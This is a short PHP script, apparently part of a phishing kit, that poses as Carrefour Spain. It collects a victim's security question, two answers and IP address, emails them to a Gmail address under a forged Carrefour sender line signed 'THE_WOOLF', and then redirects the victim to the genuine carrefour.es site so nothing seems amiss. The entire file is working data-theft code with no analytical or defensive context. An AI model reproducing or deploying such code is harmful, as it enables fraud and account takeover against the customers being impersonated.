<?php
$ip = getenv("REMOTE_ADDR");

$swn6 = $_POST['question'];
$swn7 = $_POST['response'];
$swn8 = $_POST['response_repeat'];






$subj = "[ $ip $CC ]";
$msg = " -------------------- QUESTIONS CARREFOUR SPAIN ----------------------\n
 Question : $swn6 \n
 Reponse: $swn7 \n
 Reponse 2 : $swn8 \n


 
 IP: $ip \n --------------------BY THE_WOOLF----------------------";
  $from = "From: CARREFOUR <dss@p3plcpnl0992.prod.phx3.secureserver.net>"; 
 mail("louannedu490@gmail.com", "$subj", "$msg" , "$from");


?>
<html>
<head></head>
<body>
<Script Language='Javascript'>
document.location = "https://www.carrefour.es/";
</Script>
</body>
</html>